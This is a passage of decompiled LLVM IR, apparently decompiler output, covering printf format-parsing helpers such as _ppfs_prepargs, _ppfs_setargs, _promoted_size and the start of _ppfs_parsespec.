  %v2_8060390 = load i32, i32* %v1_8060390, align 4
  %v4_8060395.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8060395.backedge

dec_label_pc_8060394:                             ; preds = %dec_label_pc_8060373, %dec_label_pc_806036e
  %v0_8060394 = phi i32 [ %v1_8060373, %dec_label_pc_8060373 ], [ %v0_806037327, %dec_label_pc_806036e ]
  %v1_8060394 = add i32 %v0_8060394, 1
  br label %dec_label_pc_8060395.backedge

dec_label_pc_8060395.backedge:                    ; preds = %dec_label_pc_8060394, %dec_label_pc_8060390
  %v4_8060395.pre = phi i32 [ %v4_8060395.pre.pre, %dec_label_pc_8060390 ], [ %v6_806039529, %dec_label_pc_8060394 ]
  %storemerge4 = phi i32 [ %v2_8060390, %dec_label_pc_8060390 ], [ %v1_8060394, %dec_label_pc_8060394 ]
  store i32 %storemerge4, i32* %eax.global-to-local, align 4
  %v1_8060395 = inttoptr i32 %storemerge4 to i8*
  %v2_8060395 = load i8, i8* %v1_8060395, align 1
  %v3_8060395 = zext i8 %v2_8060395 to i32
  %v5_8060395 = and i32 %v4_8060395.pre, -256
  %v6_8060395 = or i32 %v3_8060395, %v5_8060395
  store i32 %v6_8060395, i32* @edx, align 4
  %v4_8060397 = icmp eq i8 %v2_8060395, 0
  %v1_8060399 = icmp eq i1 %v4_8060397, false
  br i1 %v1_8060399, label %dec_label_pc_806036e, label %dec_label_pc_8060395.dec_label_pc_806039b_crit_edge

dec_label_pc_8060395.dec_label_pc_806039b_crit_edge: ; preds = %dec_label_pc_8060395.backedge
  %v0_806039b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806039b

dec_label_pc_806039b:                             ; preds = %dec_label_pc_8060395.dec_label_pc_806039b_crit_edge, %dec_label_pc_806036a
  %v0_806039b = phi i32 [ %v0_806039b.pre, %dec_label_pc_8060395.dec_label_pc_806039b_crit_edge ], [ %v0_806036a, %dec_label_pc_806036a ]
  %v1_806039b = load i32, i32* @esi, align 4
  %v2_806039b = inttoptr i32 %v1_806039b to i32*
  store i32 %v0_806039b, i32* %v2_806039b, align 4
  br label %dec_label_pc_806039f

dec_label_pc_806039f:                             ; preds = %dec_label_pc_8060379, %dec_label_pc_806039b
  %storemerge = phi i32 [ 0, %dec_label_pc_806039b ], [ -1, %dec_label_pc_8060379 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80603a2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80603a2, i32* @ebx, align 4
  store i32 %v0_806033b, i32* @esi, align 4
  store i32 %v0_8060338, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8060395, { 1, 0 }
  uselistorder i8 %v2_8060395, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 2, 0 }
  uselistorder i32 %v0_806037327, { 1, 0 }
  uselistorder i32 %v0_806036a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8060367, { 0, 2, 1 }
  uselistorder i32 %v1_8060364, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 2, 3, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32)* @_ppfs_parsespec, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_806039f, { 1, 0 }
  uselistorder label %dec_label_pc_806036e, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80603a8 = load i32, i32* @esi, align 4
  %v0_80603a9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80603b5 = add i32 %arg1, 24
  %v2_80603b5 = inttoptr i32 %v1_80603b5 to i32*
  %v3_80603b5 = load i32, i32* %v2_80603b5, align 4
  %v2_80603b8 = add i32 %arg1, 76
  %v3_80603b8 = inttoptr i32 %v2_80603b8 to i32*
  store i32 %arg2, i32* %v3_80603b8, align 4
  %tmp8 = icmp slt i32 %v3_80603b5, 1
  br i1 %tmp8, label %dec_label_pc_80603e6, label %dec_label_pc_80603bf

dec_label_pc_80603bf:                             ; preds = %entry
  %v1_80603c2 = load i32, i32* @ebx, align 4
  %v2_80603c2 = add i32 %v1_80603c2, 28
  %v3_80603c2 = inttoptr i32 %v2_80603c2 to i32*
  store i32 %v3_80603b5, i32* %v3_80603c2, align 4
  %v0_80603c5 = load i32, i32* @ebx, align 4
  %v1_80603c5 = add i32 %v0_80603c5, 24
  %v2_80603c5 = inttoptr i32 %v1_80603c5 to i32*
  store i32 0, i32* %v2_80603c5, align 4
  %v0_80603cc = load i32, i32* @ebx, align 4
  %v1_80603cc = add i32 %v0_80603cc, 4
  %v2_80603cc = inttoptr i32 %v1_80603cc to i32*
  store i32 0, i32* %v2_80603cc, align 4
  %v0_80603d3 = load i32, i32* @ebx, align 4
  %v1_80603d3 = add i32 %v0_80603d3, 8
  %v2_80603d3 = inttoptr i32 %v1_80603d3 to i32*
  store i32 0, i32* %v2_80603d3, align 4
  %v0_80603da = load i32, i32* @ebx, align 4
  %v1_80603db = call i32 @_ppfs_setargs(i32 %v0_80603da)
  %v1_80603e3 = load i32, i32* @ebx, align 4
  %v2_80603e3 = add i32 %v1_80603e3, 24
  %v3_80603e3 = inttoptr i32 %v2_80603e3 to i32*
  store i32 %v3_80603b5, i32* %v3_80603e3, align 4
  br label %dec_label_pc_80603e6

dec_label_pc_80603e6:                             ; preds = %entry, %dec_label_pc_80603bf
  %v2_80603e6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80603a9, i32* @ebx, align 4
  store i32 %v0_80603a8, i32* @esi, align 4
  ret i32 %v2_80603e6

; uselistorder directives
  uselistorder i32 %v3_80603b5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80603e6, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80603ed = load i32, i32* @ebx, align 4
  store i32 %v0_80603ed, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_80603f2 = add i32 %arg1, 24
  %v2_80603f2 = inttoptr i32 %v1_80603f2 to i32*
  %v3_80603f2 = load i32, i32* %v2_80603f2, align 4
  %v4_80603f2 = icmp eq i32 %v3_80603f2, 0
  %v1_80603f6 = icmp eq i1 %v4_80603f2, false
  %v1_80604b1 = add i32 %arg1, 8
  %v2_80604b1 = inttoptr i32 %v1_80604b1 to i32*
  %v3_80604b1 = load i32, i32* %v2_80604b1, align 4
  %v8_80604b1 = icmp eq i32 %v3_80604b1, -2147483648
  %v1_80604b8 = icmp eq i1 %v8_80604b1, false
  br i1 %v1_80603f6, label %dec_label_pc_80604b1, label %dec_label_pc_80603fc

dec_label_pc_80603fc:                             ; preds = %entry
  br i1 %v1_80604b8, label %dec_label_pc_8060416, label %dec_label_pc_8060405

dec_label_pc_8060405:                             ; preds = %dec_label_pc_80603fc
  %v1_8060405 = add i32 %arg1, 76
  %v2_8060405 = inttoptr i32 %v1_8060405 to i32*
  %v3_8060405 = load i32, i32* %v2_8060405, align 4
  store i32 %v3_8060405, i32* %eax.global-to-local, align 4
  %v1_8060408 = add i32 %v3_8060405, 4
  store i32 %v1_8060408, i32* %edx.global-to-local, align 4
  %v1_806040b = inttoptr i32 %v3_8060405 to i32*
  %v2_806040b = load i32, i32* %v1_806040b, align 4
  store i32 %v2_806040b, i32* %eax.global-to-local, align 4
  store i32 %v1_8060408, i32* %v2_8060405, align 4
  %v0_8060410 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060410 = load i32, i32* @ecx, align 4
  %v2_8060410 = add i32 %v1_8060410, 80
  %v3_8060410 = inttoptr i32 %v2_8060410 to i32*
  store i32 %v0_8060410, i32* %v3_8060410, align 4
  %v0_8060413 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060413 = load i32, i32* @ecx, align 4
  %v2_8060413 = add i32 %v1_8060413, 8
  %v3_8060413 = inttoptr i32 %v2_8060413 to i32*
  store i32 %v0_8060413, i32* %v3_8060413, align 4
  %v0_8060416.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8060416

dec_label_pc_8060416:                             ; preds = %dec_label_pc_80603fc, %dec_label_pc_8060405
  %v1_806042a = phi i32 [ %arg1, %dec_label_pc_80603fc ], [ %v0_8060416.pre, %dec_label_pc_8060405 ]
  %v1_8060416 = add i32 %v1_806042a, 4
  %v2_8060416 = inttoptr i32 %v1_8060416 to i32*
  %v3_8060416 = load i32, i32* %v2_8060416, align 4
  %v8_8060416 = icmp eq i32 %v3_8060416, -2147483648
  %v1_806041d = add i32 %v1_806042a, 80
  store i32 %v1_806041d, i32* %ebx.global-to-local, align 4
  %v1_8060420 = icmp eq i1 %v8_8060416, false
  br i1 %v1_8060420, label %dec_label_pc_8060433, label %dec_label_pc_8060422

dec_label_pc_8060422:                             ; preds = %dec_label_pc_8060416
  %v1_8060422 = add i32 %v1_806042a, 76
  %v2_8060422 = inttoptr i32 %v1_8060422 to i32*
  %v3_8060422 = load i32, i32* %v2_8060422, align 4
  store i32 %v3_8060422, i32* %eax.global-to-local, align 4
  %v1_8060425 = add i32 %v3_8060422, 4
  store i32 %v1_8060425, i32* %edx.global-to-local, align 4
  %v1_8060428 = inttoptr i32 %v3_8060422 to i32*
  %v2_8060428 = load i32, i32* %v1_8060428, align 4
  store i32 %v2_8060428, i32* %eax.global-to-local, align 4
  store i32 %v1_8060425, i32* %v2_8060422, align 4
  %v0_806042d = load i32, i32* %eax.global-to-local, align 4
  %v1_806042d = load i32, i32* @ecx, align 4
  %v2_806042d = add i32 %v1_806042d, 80
  %v3_806042d = inttoptr i32 %v2_806042d to i32*
  store i32 %v0_806042d, i32* %v3_806042d, align 4
  %v0_8060430 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060430 = load i32, i32* @ecx, align 4
  %v2_8060430 = add i32 %v1_8060430, 4
  %v3_8060430 = inttoptr i32 %v2_8060430 to i32*
  store i32 %v0_8060430, i32* %v3_8060430, align 4
  %v1_80604aa15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8060433

dec_label_pc_8060433:                             ; preds = %dec_label_pc_8060416, %dec_label_pc_8060422
  %v1_80604aa15 = phi i32 [ %v1_806042a, %dec_label_pc_8060416 ], [ %v1_80604aa15.pre, %dec_label_pc_8060422 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80604aa16 = add i32 %v1_80604aa15, 28
  %v3_80604aa17 = inttoptr i32 %v2_80604aa16 to i32*
  %v4_80604aa18 = load i32, i32* %v3_80604aa17, align 4
  %v5_80604ad20 = icmp sgt i32 %v4_80604aa18, 0
  br i1 %v5_80604ad20, label %dec_label_pc_8060437, label %dec_label_pc_80604df.loopexit

dec_label_pc_8060437:                             ; preds = %dec_label_pc_8060433, %dec_label_pc_80604aa.backedge
  %v1_80604aa22 = phi i32 [ %v1_80604aa, %dec_label_pc_80604aa.backedge ], [ %v1_80604aa15, %dec_label_pc_8060433 ]
  %v0_806043b21 = phi i32 [ %v0_806043b.be, %dec_label_pc_80604aa.backedge ], [ 0, %dec_label_pc_8060433 ]
  %v2_8060437 = mul i32 %v0_806043b21, 4
  %v3_8060437 = add i32 %v1_80604aa22, 40
  %v4_8060437 = add i32 %v3_8060437, %v2_8060437
  %v5_8060437 = inttoptr i32 %v4_8060437 to i32*
  %v6_8060437 = load i32, i32* %v5_8060437, align 4
  store i32 %v6_8060437, i32* %eax.global-to-local, align 4
  %v1_806043b = add i32 %v0_806043b21, 1
  store i32 %v1_806043b, i32* %esi.global-to-local, align 4
  %v1_806043c = add i32 %v6_8060437, -8
  %v9_806043c = icmp eq i32 %v1_806043c, 0
  br i1 %v9_806043c, label %dec_label_pc_80604aa.backedge, label %dec_label_pc_8060441

dec_label_pc_8060441:                             ; preds = %dec_label_pc_8060437
  %v10_806043c = icmp slt i32 %v1_806043c, 0
  %v6_806043c = sub i32 7, %v6_8060437
  %v7_806043c = and i32 %v6_806043c, %v6_8060437
  %v8_806043c = icmp slt i32 %v7_806043c, 0
  %v1_8060441 = add i32 %v1_80604aa22, 76
  %v2_8060441 = inttoptr i32 %v1_8060441 to i32*
  %v3_8060441 = load i32, i32* %v2_8060441, align 4
  store i32 %v3_8060441, i32* %edx.global-to-local, align 4
  %v3_8060444 = icmp eq i1 %v10_806043c, %v8_806043c
  br i1 %v3_8060444, label %dec_label_pc_8060454, label %dec_label_pc_8060446

dec_label_pc_8060446:                             ; preds = %dec_label_pc_8060441
  %tmp13 = icmp slt i32 %v6_8060437, 3
  %v9_806044d = icmp eq i32 %v6_8060437, 7
  %v1_8060450 = icmp eq i1 %v9_806044d, false
  %or.cond = or i1 %tmp13, %v1_8060450
  br i1 %or.cond, label %dec_label_pc_806049d, label %dec_label_pc_806047f

dec_label_pc_8060454:                             ; preds = %dec_label_pc_8060441
  %tmp14 = icmp sgt i32 %v6_8060437, 1024
  br i1 %tmp14, label %dec_label_pc_806045d, label %dec_label_pc_806049d

dec_label_pc_806045d:                             ; preds = %dec_label_pc_8060454
  %v6_806045d = icmp eq i32 %v6_8060437, 2048
  br i1 %v6_806045d, label %dec_label_pc_806046d, label %dec_label_pc_8060464

dec_label_pc_8060464:                             ; preds = %dec_label_pc_806045d
  %v9_8060464 = icmp eq i32 %v6_8060437, 2055
  %v1_8060469 = icmp eq i1 %v9_8060464, false
  br i1 %v1_8060469, label %dec_label_pc_806049d, label %dec_label_pc_806048e

dec_label_pc_806046d:                             ; preds = %dec_label_pc_806045d
  %v1_806046d = add i32 %v3_8060441, 8
  store i32 %v1_806046d, i32* %eax.global-to-local, align 4
  store i32 %v1_806046d, i32* %v2_8060441, align 4
  %v0_8060473 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060473 = inttoptr i32 %v0_8060473 to i32*
  %v2_8060473 = load i32, i32* %v1_8060473, align 4
  store i32 %v2_8060473, i32* %eax.global-to-local, align 4
  %v1_8060475 = add i32 %v0_8060473, 4
  %v2_8060475 = inttoptr i32 %v1_8060475 to i32*
  %v3_8060475 = load i32, i32* %v2_8060475, align 4
  store i32 %v3_8060475, i32* %edx.global-to-local, align 4
  %v1_8060478 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8060478 = inttoptr i32 %v1_8060478 to i32*
  store i32 %v2_8060473, i32* %v2_8060478, align 4
  %v0_806047a = load i32, i32* %edx.global-to-local, align 4
  %v1_806047a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806047a = add i32 %v1_806047a, 4
  %v3_806047a = inttoptr i32 %v2_806047a to i32*
  store i32 %v0_806047a, i32* %v3_806047a, align 4
  br label %dec_label_pc_80604a7

dec_label_pc_806047f:                             ; preds = %dec_label_pc_8060446
  %v3_806047f = load i32, i32* %v2_8060441, align 4
  store i32 %v3_806047f, i32* %edx.global-to-local, align 4
  %v1_8060482 = inttoptr i32 %v3_806047f to double*
  %v2_8060482 = load double, double* %v1_8060482, align 4
  %v3_8060482 = fpext double %v2_8060482 to x86_fp80
  store x86_fp80 %v3_8060482, x86_fp80* %st0.global-to-local, align 4
  %v1_8060484 = add i32 %v3_806047f, 8
  store i32 %v1_8060484, i32* %eax.global-to-local, align 4
  store i32 %v1_8060484, i32* %v2_8060441, align 4
  %v1_806048a = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v2_806048a = load i32, i32* %ebx.global-to-local, align 4
  %v3_806048a = fptrunc x86_fp80 %v1_806048a to double
  %v4_806048a = inttoptr i32 %v2_806048a to double*
  store double %v3_806048a, double* %v4_806048a, align 4
  br label %dec_label_pc_80604a7

dec_label_pc_806048e:                             ; preds = %dec_label_pc_8060464
  %v3_806048e = load i32, i32* %v2_8060441, align 4
  store i32 %v3_806048e, i32* %edx.global-to-local, align 4
  %v1_8060491 = inttoptr i32 %v3_806048e to x86_fp80*
  %v2_8060491 = load x86_fp80, x86_fp80* %v1_8060491, align 4
  store x86_fp80 %v2_8060491, x86_fp80* %st0.global-to-local, align 4
  %v1_8060493 = add i32 %v3_806048e, 12
  store i32 %v1_8060493, i32* %eax.global-to-local, align 4
  store i32 %v1_8060493, i32* %v2_8060441, align 4
  %v1_8060499 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v2_8060499 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8060499 = inttoptr i32 %v2_8060499 to x86_fp80*
  store x86_fp80 %v1_8060499, x86_fp80* %v3_8060499, align 4
  br label %dec_label_pc_80604a7

dec_label_pc_806049d:                             ; preds = %dec_label_pc_8060446, %dec_label_pc_8060454, %dec_label_pc_8060464
  %v1_806049d = add i32 %v3_8060441, 4
  store i32 %v1_806049d, i32* %eax.global-to-local, align 4
  store i32 %v1_806049d, i32* %v2_8060441, align 4
  %v0_80604a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80604a3 = inttoptr i32 %v0_80604a3 to i32*
  %v2_80604a3 = load i32, i32* %v1_80604a3, align 4
  store i32 %v2_80604a3, i32* %eax.global-to-local, align 4
  %v1_80604a5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80604a5 = inttoptr i32 %v1_80604a5 to i32*
  store i32 %v2_80604a3, i32* %v2_80604a5, align 4
  br label %dec_label_pc_80604a7

dec_label_pc_80604a7:                             ; preds = %dec_label_pc_806048e, %dec_label_pc_806047f, %dec_label_pc_806046d, %dec_label_pc_806049d
  %v0_80604a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80604a7 = add i32 %v0_80604a7, 12
  store i32 %v1_80604a7, i32* %ebx.global-to-local, align 4
  %v0_80604aa.pre.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80604aa.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80604aa.backedge

dec_label_pc_80604aa.backedge:                    ; preds = %dec_label_pc_80604a7, %dec_label_pc_8060437
  %v1_80604aa = phi i32 [ %v1_80604aa.pre, %dec_label_pc_80604a7 ], [ %v1_80604aa22, %dec_label_pc_8060437 ]
  %v0_806043b.be = phi i32 [ %v0_80604aa.pre.pre, %dec_label_pc_80604a7 ], [ %v1_806043b, %dec_label_pc_8060437 ]
  %v2_80604aa = add i32 %v1_80604aa, 28
  %v3_80604aa = inttoptr i32 %v2_80604aa to i32*
  %v4_80604aa = load i32, i32* %v3_80604aa, align 4
  %v5_80604ad = icmp slt i32 %v0_806043b.be, %v4_80604aa
  br i1 %v5_80604ad, label %dec_label_pc_8060437, label %dec_label_pc_80604aa.dec_label_pc_80604df.loopexit_crit_edge

dec_label_pc_80604b1:                             ; preds = %entry
  br i1 %v1_80604b8, label %dec_label_pc_80604c8, label %dec_label_pc_80604ba

dec_label_pc_80604ba:                             ; preds = %dec_label_pc_80604b1
  %v1_80604ba = add i32 %arg1, 36
  %v2_80604ba = inttoptr i32 %v1_80604ba to i8*
  %v3_80604ba = load i8, i8* %v2_80604ba, align 1
  %v2_80604be = zext i8 %v3_80604ba to i32
  %v3_80604be = mul nuw nsw i32 %v2_80604be, 12
  store i32 %v3_80604be, i32* %eax.global-to-local, align 4
  %v2_80604c1 = add i32 %arg1, 68
  %v3_80604c1 = add i32 %v2_80604c1, %v3_80604be
  %v4_80604c1 = inttoptr i32 %v3_80604c1 to i32*
  %v5_80604c1 = load i32, i32* %v4_80604c1, align 4
  store i32 %v5_80604c1, i32* %eax.global-to-local, align 4
  store i32 %v5_80604c1, i32* %v2_80604b1, align 4
  %v0_80604c8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80604c8

dec_label_pc_80604c8:                             ; preds = %dec_label_pc_80604b1, %dec_label_pc_80604ba
  %v1_80604dc = phi i32 [ %arg1, %dec_label_pc_80604b1 ], [ %v0_80604c8.pre, %dec_label_pc_80604ba ]
  %v1_80604c8 = add i32 %v1_80604dc, 4
  %v2_80604c8 = inttoptr i32 %v1_80604c8 to i32*
  %v3_80604c8 = load i32, i32* %v2_80604c8, align 4
  %v8_80604c8 = icmp eq i32 %v3_80604c8, -2147483648
  %v1_80604cf = icmp eq i1 %v8_80604c8, false
  br i1 %v1_80604cf, label %dec_label_pc_80604df, label %dec_label_pc_80604d1

dec_label_pc_80604d1:                             ; preds = %dec_label_pc_80604c8
  %v1_80604d1 = add i32 %v1_80604dc, 37
  %v2_80604d1 = inttoptr i32 %v1_80604d1 to i8*
  %v3_80604d1 = load i8, i8* %v2_80604d1, align 1
  %v2_80604d5 = zext i8 %v3_80604d1 to i32
  %v3_80604d5 = mul nuw nsw i32 %v2_80604d5, 12
  store i32 %v3_80604d5, i32* %eax.global-to-local, align 4
  %v2_80604d8 = add i32 %v1_80604dc, 68
  %v3_80604d8 = add i32 %v2_80604d8, %v3_80604d5
  %v4_80604d8 = inttoptr i32 %v3_80604d8 to i32*
  %v5_80604d8 = load i32, i32* %v4_80604d8, align 4
  store i32 %v5_80604d8, i32* %eax.global-to-local, align 4
  store i32 %v5_80604d8, i32* %v2_80604c8, align 4
  %v0_80604df.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80604df

dec_label_pc_80604aa.dec_label_pc_80604df.loopexit_crit_edge: ; preds = %dec_label_pc_80604aa.backedge
  br label %dec_label_pc_80604df.loopexit

dec_label_pc_80604df.loopexit:                    ; preds = %dec_label_pc_80604aa.dec_label_pc_80604df.loopexit_crit_edge, %dec_label_pc_8060433
  %v1_80604aa.lcssa = phi i32 [ %v1_80604aa, %dec_label_pc_80604aa.dec_label_pc_80604df.loopexit_crit_edge ], [ %v1_80604aa15, %dec_label_pc_8060433 ]
  br label %dec_label_pc_80604df

dec_label_pc_80604df:                             ; preds = %dec_label_pc_80604df.loopexit, %dec_label_pc_80604c8, %dec_label_pc_80604d1
  %v1_80604e8 = phi i32 [ %v1_80604aa.lcssa, %dec_label_pc_80604df.loopexit ], [ %v1_80604dc, %dec_label_pc_80604c8 ], [ %v0_80604df.pre, %dec_label_pc_80604d1 ]
  %v1_80604df = add i32 %v1_80604e8, 8
  %v2_80604df = inttoptr i32 %v1_80604df to i32*
  %v3_80604df = load i32, i32* %v2_80604df, align 4
  store i32 %v3_80604df, i32* %eax.global-to-local, align 4
  %v2_80604e2 = icmp slt i32 %v3_80604df, 0
  %v1_80604e4 = icmp eq i1 %v2_80604e2, false
  br i1 %v1_80604e4, label %dec_label_pc_80604fe, label %dec_label_pc_80604e6

dec_label_pc_80604e6:                             ; preds = %dec_label_pc_80604df
  %v1_80604e6 = sub i32 0, %v3_80604df
  store i32 %v1_80604e6, i32* %eax.global-to-local, align 4
  store i32 %v1_80604e6, i32* %v2_80604df, align 4
  %v0_80604eb = load i32, i32* @ecx, align 4
  %v1_80604eb = add i32 %v0_80604eb, 16
  %v2_80604eb = inttoptr i32 %v1_80604eb to i32*
  %v3_80604eb = load i32, i32* %v2_80604eb, align 4
  store i32 %v3_80604eb, i32* %eax.global-to-local, align 4
  %v1_80604ee = add i32 %v0_80604eb, 20
  %v2_80604ee = inttoptr i32 %v1_80604ee to i32*
  store i32 32, i32* %v2_80604ee, align 4
  %v0_80604f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80604f5 = and i32 %v0_80604f5, -10
  %v1_80604f8 = or i32 %v1_80604f5, 8
  store i32 %v1_80604f8, i32* %eax.global-to-local, align 4
  %v1_80604fb = load i32, i32* @ecx, align 4
  %v2_80604fb = add i32 %v1_80604fb, 16
  %v3_80604fb = inttoptr i32 %v2_80604fb to i32*
  store i32 %v1_80604f8, i32* %v3_80604fb, align 4
  %v0_8060500.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80604fe

dec_label_pc_80604fe:                             ; preds = %dec_label_pc_80604df, %dec_label_pc_80604e6
  %v0_8060500 = phi i32 [ %v3_80604df, %dec_label_pc_80604df ], [ %v0_8060500.pre, %dec_label_pc_80604e6 ]
  %v2_80604fe = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80604fe, i32* @ebx, align 4
  ret i32 %v0_8060500

; uselistorder directives
  uselistorder i32 %v1_80604f8, { 1, 0 }
  uselistorder i32 %v3_80604d5, { 1, 0 }
  uselistorder i32 %v3_80604be, { 1, 0 }
  uselistorder i32 %v0_806043b.be, { 1, 0 }
  uselistorder i32 %v1_80604aa, { 1, 2, 0 }
  uselistorder i32 %v3_8060441, { 1, 0, 2 }
  uselistorder i32* %v2_8060441, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_806043c, { 1, 0 }
  uselistorder i32 %v6_8060437, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v0_806043b21, { 1, 0 }
  uselistorder i32 %v1_80604aa22, { 0, 2, 1 }
  uselistorder i32 %v1_80604aa15, { 2, 0, 1 }
  uselistorder i1 %v1_80604b8, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder label %dec_label_pc_80604fe, { 1, 0 }
  uselistorder label %dec_label_pc_80604df, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80604c8, { 1, 0 }
  uselistorder label %dec_label_pc_80604a7, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806049d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060437, { 1, 0 }
  uselistorder label %dec_label_pc_8060433, { 1, 0 }
  uselistorder label %dec_label_pc_8060416, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8060504 = load i32, i32* @eax, align 4
  store i32 %v0_8060504, i32* @ecx, align 4
  br label %dec_label_pc_806050b

dec_label_pc_806050b:                             ; preds = %dec_label_pc_806050b, %entry
  %v0_806050b = phi i32 [ ptrtoint (i8** @global_var_806ef48.1578 to i32), %entry ], [ %v1_806050b, %dec_label_pc_806050b ]
  %v1_806050b = add i32 %v0_806050b, -2
  %v1_806050e = inttoptr i32 %v1_806050b to i16*
  %v2_806050e = load i16, i16* %v1_806050e, align 2
  %v3_806050e = sext i16 %v2_806050e to i32
  %v12_8060511 = icmp ne i32 %v3_806050e, %v0_8060504
  %v6_806051b = icmp ugt i32 %v1_806050b, ptrtoint (i32* @global_var_806ef30.1579 to i32)
  %or.cond = and i1 %v6_806051b, %v12_8060511
  br i1 %or.cond, label %dec_label_pc_806050b, label %dec_label_pc_806051d

dec_label_pc_806051d:                             ; preds = %dec_label_pc_806050b
  %.pre = add i32 %v0_806050b, -134672178
  %v2_8060523 = sdiv i32 %.pre, 2
  %v1_8060525 = add i32 %v2_8060523, ptrtoint (i8** @global_var_806ef48.1578 to i32)
  %v2_8060525 = inttoptr i32 %v1_8060525 to i8*
  %v3_8060525 = load i8, i8* %v2_8060525, align 1
  %v4_8060525 = zext i8 %v3_8060525 to i32
  ret i32 %v4_8060525

; uselistorder directives
  uselistorder i32 %v1_806050b, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806ef48.1578 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp88 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806052e = load i32, i32* @edi, align 4
  %v0_806052f = load i32, i32* @esi, align 4
  %v0_8060530 = load i32, i32* @ebx, align 4
  store i32 %v0_8060530, i32* %stack_var_-16, align 4
  %v4_8060530 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp88, i32* %edx.global-to-local, align 4
  store i32 %tmp88, i32* %eax.global-to-local, align 4
  %v1_8060562 = add i32 %tmp88, 16
  %v2_8060562 = inttoptr i32 %v1_8060562 to i32*
  %v3_8060562 = load i32, i32* %v2_8060562, align 4
  store i32 %v3_8060562, i32* %ebp.global-to-local, align 4
  %v1_8060565 = add i32 %tmp88, 24
  %v2_8060565 = inttoptr i32 %v1_8060565 to i32*
  %v3_8060565 = load i32, i32* %v2_8060565, align 4
  store i32 %v3_8060565, i32* %eax.global-to-local, align 4
  %v1_8060568 = and i32 %v3_8060562, 128
  %v2_8060568 = icmp eq i32 %v1_8060568, 0
  store i32 %v1_8060568, i32* %ebp.global-to-local, align 4
  %v1_8060572 = icmp eq i1 %v2_8060568, false
  br i1 %v1_8060572, label %dec_label_pc_8060578, label %dec_label_pc_8060574

dec_label_pc_8060574:                             ; preds = %entry
  %v1_8060574 = inttoptr i32 %tmp88 to i32*
  %v2_8060574 = load i32, i32* %v1_8060574, align 4
  br label %dec_label_pc_80605c8.outer

dec_label_pc_8060578:                             ; preds = %entry
  %v15_8060531 = ptrtoint i32* %stack_var_-124 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_8060588 = inttoptr i32 %tmp88 to i32*
  br label %dec_label_pc_806057a

dec_label_pc_806057a:                             ; preds = %dec_label_pc_80605a5.dec_label_pc_806057a_crit_edge, %dec_label_pc_8060578
